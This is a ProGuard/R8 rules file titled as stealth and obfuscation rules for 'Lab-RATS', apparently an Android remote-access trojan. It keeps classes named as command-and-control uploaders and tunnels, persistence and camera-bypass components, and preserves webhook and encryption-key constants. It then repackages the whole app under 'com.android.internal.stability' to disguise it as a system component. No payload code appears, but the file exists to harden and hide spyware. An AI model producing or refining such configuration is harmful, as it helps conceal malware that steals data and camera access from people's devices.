# Hardened ProGuard / R8 Stealth & Obfuscation Rules for Lab-RATS

# 1. Core Background Services & Exfiltration Handlers (Prevent R8 Stripping)
-keep class com.labs.labrats.WorkManager_Sync { *; }
-keep class com.labs.labrats.C2_Uploader { *; }
-keep class com.labs.labrats.C2_Tunnel { *; }
-keep class com.labs.labrats.SystemAnalytics { *; }
-keep class com.labs.labrats.FirebaseConfig { *; }
-keep class com.labs.labrats.IO_Persistence_Manager { *; }
-keep class com.labs.labrats.LabRatsWorker { *; }

# 2. Build-Time Configuration & Key Preservation
-keep class com.labs.labrats.BuildConfig {
    public static final java.lang.String WEBHOOK_URL;
    public static final java.lang.String ENCRYPTION_KEY;
    public static final int DECOY_CHOICE;
}

# 3. Core Web Server & WebSocket Protocols (NanoHTTPD / Java_WebSocket / Gson)
-keep class fi.iki.elonen.** { *; }
-keep class org.java_websocket.** { *; }
-keep class com.google.gson.** { *; }

# 4. Critical Type Signatures & Annotations
-keepattributes Signature
-keepattributes *Annotation*
-keepattributes EnclosingMethod
-keepattributes InnerClasses

# 5. Reflection Targets
-keep class com.labs.labrats.Api24Helper { *; }
-keep class com.labs.labrats.Api30Helper { *; }
-keep class com.labs.labrats.CameraHelper$BypassActivity { *; }

# 6. JavaScript Interface for Web Overlays
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

# 7. Fast R8 Obfuscation (Preserves full class renaming/obfuscation while bypassing 60s optimization passes)
-dontoptimize
-dontpreverify
-allowaccessmodification
-repackageclasses 'com.android.internal.stability'
